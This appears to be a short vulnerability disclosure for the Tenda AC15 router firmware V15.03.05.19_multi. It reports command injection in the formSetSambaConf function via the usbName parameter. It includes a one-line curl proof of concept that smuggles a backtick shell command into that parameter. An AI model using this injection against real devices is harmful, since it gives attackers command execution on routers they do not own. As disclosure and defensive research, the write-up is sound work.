## Tenda AC15 command injection

### Overview

* Vendor: Tenda

* Product: Tenda AC15
* Version: V15.03.05.19_multi

* Manufacturer's address：https://www.tendacn.com/
* Firmware download address ：https://static.tenda.com.cn/tdcweb/download/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip

### Vulnerability details

Tenda AC15 V15.03.05.19_multi was found to contain a command injection vulnerability in the `formSetSambaConf` function via the `usbName` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

![image](./img/1.png)

![image](./img/2.png)

#### PoC

```
curl http://192.168.0.1/goform/SetSambaCfg?action=del&usbName=`touch%20/tmp/2.txt`
```

![image-20250413210610225](./img/3.png)
